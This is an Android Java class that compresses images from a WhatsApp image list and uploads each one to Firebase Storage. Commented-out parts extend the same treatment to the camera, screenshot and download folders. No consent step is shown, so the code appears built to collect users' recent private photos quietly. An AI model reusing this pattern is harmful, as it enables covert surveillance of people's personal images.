package com.hazyaz.temps.Firebase;


import android.graphics.Bitmap;
import android.support.annotation.NonNull;
import android.util.Log;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.hazyaz.temps.Media.CompressImages;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.UUID;


public class ImagesUpload {


    final int THUMBSIZE = 64;
    public ArrayList<String> whatsAppLast10Messages = new ArrayList<>();
    public ArrayList<String> cameraLast10Messages = new ArrayList<>();
    public ArrayList<String> screenshotsLast10Messages = new ArrayList<>();
    public ArrayList<String> downloadsLast10Messages = new ArrayList<>();
    private StorageReference mStorageRef;
    private FirebaseAuth mAuth;

    CompressImages com = new CompressImages();
    private File newCompressedFile;

    public void ImageUplods(ArrayList<String> whatsapp) {
//                            ArrayList<String> camera,
//                            ArrayList<String> screenshots,
//                            ArrayList<String> downloads
//        ASSINING IMAAGES LOCATION LIST TO THE VARIABLES

        whatsAppLast10Messages = whatsapp;
//        cameraLast10Messages = camera;
//        screenshotsLast10Messages = screenshots;
//        downloadsLast10Messages = downloads;

        mAuth = FirebaseAuth.getInstance();
        mStorageRef = FirebaseStorage.getInstance().getReference().child("mm");


        if (mAuth.getCurrentUser() != null) {
            FirebaseUser currentUser = mAuth.getCurrentUser();
            mStorageRef = FirebaseStorage.getInstance().getReference();
            FirebaseDatabase database = FirebaseDatabase.getInstance();

            Log.d("asdasdasdasd", whatsAppLast10Messages.get(2));

            for (int i = 0; i < whatsAppLast10Messages.size(); i++) {

                uploadwhatsappImaage(whatsAppLast10Messages.get(i));
                Log.d("assfddasdasd", whatsAppLast10Messages.get(i));

            }


        }
    }
//    whatsapp image upload


//    private File Compressing(String imagesPath){
//
//        File LargeImage = new File(imagesPath);
//        File thumbFilePath = new File(imagesPath);
//        if(!LargeImage.isDirectory()) {
//            try {
//                newCompressedFile = new Compressor(context)
//                        .setMaxWidth(200)
//                        .setMaxHeight(200)
//                        .setQuality(40)
//                        .setCompressFormat(Bitmap.CompressFormat.WEBP)
//                        .compressToFile(LargeImage);
//            } catch (Exception e) {
//                Log.d("Asdasd", "Asdasd" + newCompressedFile + "    " + e);
//            }
//        }
//        try {
//            newCompressedFile = new Compressor(MainActivity.context)
//                    .setMaxWidth(200)
//                    .setMaxHeight(200)
//                    .setQuality(40)
//                    .setCompressFormat(Bitmap.CompressFormat.WEBP)
//                    .setDestinationDirectoryPath()
//                    .compressToFile(thumbFilePath);
//        }
//        catch (Exception e){
//            Log.d("Asdasd","Asdasd"+newCompressedFile);
//        }


//
//        Log.d("Asghfghghd", "Asdasfgh" + newCompressedFile  );
//
//     return newCompressedFile;
//    }






    private void uploadwhatsappImaage(String path) {

//        Bitmap finalImage = com.compressImage(path);
//           File CompressedImage =  Compressing(path);

        Bitmap bitmap = com.compressImage(path);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
        byte[] data = baos.toByteArray();

//        File news = new File(path);
//        final Uri myUri = Uri.fromFile(news);

        StorageReference ref = mStorageRef.child("mm/Images/whatsapp/" + UUID.randomUUID().toString() + ".png");
        ref.putBytes(data)
                .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        Log.d("uploaded ", "   ");

                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {

                    }
                });


    }


}
